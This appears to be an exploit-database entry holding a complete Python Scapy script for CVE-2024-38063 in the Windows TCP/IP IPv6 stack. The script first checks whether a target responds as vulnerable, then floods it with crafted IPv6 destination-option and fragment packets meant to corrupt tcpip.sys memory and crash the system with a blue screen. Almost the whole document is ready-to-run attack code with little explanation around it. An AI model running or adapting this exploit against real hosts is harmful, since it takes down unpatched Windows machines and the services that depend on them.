@@ -1,0 +1,134 @@
+id: 39735
+date: 08/28/2024
+title: Windows TCP/IP - Remote Code Execution Checker and Denial of Service Exploit
+author: Photubias
+cves: CVE-2024-38063
+
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+# Exploit Title: Windows IPv6 CVE-2024-38063 Checker and Denial-Of-Service
+# Date: 2024-08-07
+# Exploit Author: Photubias
+# Vendor Homepage: https://microsoft.com
+# Vendor Advisory: [1] https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-38063
+# Version: Windows 10, 11 <10.0.26100.1457 and Server 2016-2019-2022 <10.0.17763.6189
+# Tested on: Windows 11 23H2 and Windows Server 2022
+# CVE: CVE-2024-38063
+
+import os, subprocess, re, time, sys
+
+## Variables
+sDstIP = 'fe80::78b7:6283:49ad:c565'        ## Placeholder
+if len(sys.argv) > 1: sDstIP = sys.argv[1]  ## Please provide an argument
+sDstMAC = '00:0C:29:55:E1:C8'               ## Not required, will try to get the MAC via Neighbor Discovery
+iBatches = 20
+iCorruptions = 20                           ## How many times do we want to corrupt the tcpip.sys memory per batch
+
+try:
+    print('--- Loading Scapy, might take some time ...')
+    from scapy.config import conf
+    conf.ipv6_enabled = False
+    import scapy.all as scapy
+    scapy.conf.verb = 0
+except:
+    print('Error while loading scapy, please run "pip install scapy"')
+    exit(1)
+
+import logging
+logging.getLogger('scapy.runtime').setLevel(logging.ERROR)
+
+def selectInterface(): #adapter[] = npfdevice, ip, mac
+    def getAllInterfaces(): 
+        lstInterfaces=[]
+        if os.name == 'nt':
+            proc = subprocess.Popen('getmac /NH /V /FO csv | FINDSTR /V /I disconnected', shell=True, stdout=subprocess.PIPE)
+            for bInterface in proc.stdout.readlines():
+                lstInt = bInterface.split(b',')
+                sAdapter = lstInt[0].strip(b'"').decode()
+                sDevicename = lstInt[1].strip(b'"').decode()
+                sMAC = lstInt[2].strip(b'"').decode().lower().replace('-', ':')
+                sWinguID = lstInt[3].strip().strip(b'"').decode()[-38:]
+                proc = subprocess.Popen('netsh int ipv6 show addr "{}" | FINDSTR /I Address'.format(sAdapter), shell=True, stdout=subprocess.PIPE)
+                try: sIP = re.findall(r'[\w:]+:+[\w:]+', proc.stdout.readlines()[0].strip().decode())[0]
+                except: sIP = ''
+                if len(sMAC) == 17: lstInterfaces.append([sAdapter, sIP, sMAC, sDevicename, sWinguID]) # When no or bad MAC address (e.g. PPP adapter), do not add
+        else:
+            proc = subprocess.Popen('for i in $(ip address | grep -v "lo" | grep "default" | cut -d":" -f2 | cut -d" " -f2);do echo $i $(ip address show dev $i | grep "inet6 " | cut -d" " -f6 | cut -d"/" -f1) $(ip address show dev $i | grep "ether" | cut -d" " -f6);done', shell=True, stdout=subprocess.PIPE)
+            for bInterface in proc.stdout.readlines():
+                lstInt = bInterface.strip().split(b' ')
+                try: 
+                    if len(lstInt[2]) == 17: lstInterfaces.append([lstInt[0].decode(), lstInt[1].decode(), lstInt[2].decode(), '', ''])
+                except: pass
+        return lstInterfaces
+    
+    lstInterfaces = getAllInterfaces()
+    if len(lstInterfaces) > 1:
+        i = 1
+        for lstInt in lstInterfaces: #array of arrays: adapter, ip, mac, windows devicename, windows guID
+            print('[{}] {} has {} ({})'.format(i, lstInt[2], lstInt[1], lstInt[0]))
+            i += 1
+        #sAnswer = input('[?] Please select the adapter [1]: ')
+        sAnswer='3'
+    else: sAnswer = None
+    if not sAnswer or sAnswer == '' or not sAnswer.isdigit() or int(sAnswer) >= i: sAnswer = 1
+    iAnswer = int(sAnswer) - 1
+    sNPF = lstInterfaces[iAnswer][0]
+    sIP = lstInterfaces[iAnswer][1]
+    sMAC = lstInterfaces[iAnswer][2]
+    if os.name == 'nt': sNPF = r'\Device\NPF_' + lstInterfaces[iAnswer][4]
+    return (sNPF, sIP, sMAC, lstInterfaces[iAnswer][3])
+
+def get_packets(iID, sDstIPv6, sDstMac=None):
+    iFragID = 0xbedead00 + iID
+    oPacket1 = scapy.IPv6(fl=1, hlim=64+iID, dst=sDstIPv6) / scapy.IPv6ExtHdrDestOpt(options=[scapy.PadN(otype=0x81, optdata='bad')])
+    oPacket2 = scapy.IPv6(fl=1, hlim=64+iID, dst=sDstIPv6) / scapy.IPv6ExtHdrFragment(id=iFragID, m = 1, offset = 0) / 'notalive'
+    oPacket3 = scapy.IPv6(fl=1, hlim=64+iID, dst=sDstIPv6) / scapy.IPv6ExtHdrFragment(id=iFragID, m = 0, offset = 1)
+    if sDstMac: ## Should always be this, it seems sending to 'ff:ff:ff:ff:ff:ff' does not work
+        oPacket1 = scapy.Ether(dst=sDstMac) / oPacket1
+        oPacket2 = scapy.Ether(dst=sDstMac) / oPacket2
+        oPacket3 = scapy.Ether(dst=sDstMac) / oPacket3
+    return [oPacket1, oPacket2, oPacket3]
+
+def doIPv6ND(sDstIP, sInt): ## Try to get a MAC address via IPv6 Neighbour Sollicitation
+    sMACResp = None
+    oNeighborSollicitation = scapy.IPv6(dst=sDstIP) / scapy.ICMPv6ND_NS(tgt=sDstIP) / scapy.ICMPv6NDOptSrcLLAddr(lladdr='ff:ff:ff:ff:ff:ff')
+    oResponse = scapy.sr1(oNeighborSollicitation, timeout=5, iface=sInt)
+    if oResponse and scapy.ICMPv6NDOptDstLLAddr in oResponse:
+        sMACResp = oResponse[scapy.ICMPv6NDOptDstLLAddr].lladdr
+    return sMACResp
+
+lstInt = selectInterface() ## NPF, IPv6, MAC, Name
+
+sMAC = doIPv6ND(sDstIP, lstInt[0])
+if sMAC: 
+    print(f'[+] Target {sDstIP} is reachable, got MAC Address {sMAC}')
+    sDstMAC = sMAC
+elif sDstMAC != '':
+    print('[-] Target not responding to Neighbor Sollicitation Packets, using the provided MAC {}'.format(sDstMAC))
+else: 
+    print('[-] Without a MAC address, this exploit will probably not work')
+
+lstPacketsToSend = []
+for i in range(iBatches):
+    for j in range(iCorruptions):
+        lstPacketsToSend += get_packets(j, sDstIP, sDstMAC) + get_packets(j, sDstIP, sDstMAC)
+
+## 'send' is Layer3 (let scapy figure out the MAC address), 'sendp' is L2 (MAC address is filled in, much better)
+print('[i] Verifying vulnerability against IPv6 address {}'.format(sDstIP))
+## Verification first: "ICMPv6ParamProblem"
+lstResp = scapy.srp1(lstPacketsToSend[0], iface=lstInt[0], timeout=5)
+if lstResp and scapy.IPv6 in lstResp[0] and scapy.ICMPv6ParamProblem in lstResp[0]: 
+    print('[+] Yes, {} is vulnerable and exploitable for CVE-2024-38063'.format(sDstIP))
+else: 
+    input('[-] Not vulnerable or firewall is enabled. Please verify and rerun or press enter to continue')
+print('[i] Waiting 10 seconds to let the target cool down (more is better)')
+time.sleep(10)
+input('[?] OK, continue to execute the Denial Of Service (BSOD)? Press Ctrl+C to cancel now')
+########## Exploit
+print('[+] Sending {} packets now via interface {} {}'.format(len(lstPacketsToSend), lstInt[0], lstInt[3]))
+scapy.conf.verb = 1
+scapy.sendp(lstPacketsToSend, iface=lstInt[0])
+print('[+] All packets are sent, now it takes *exactly* 60 seconds for the target to crash')
+
+#  0day.today [2024-08-30]  #
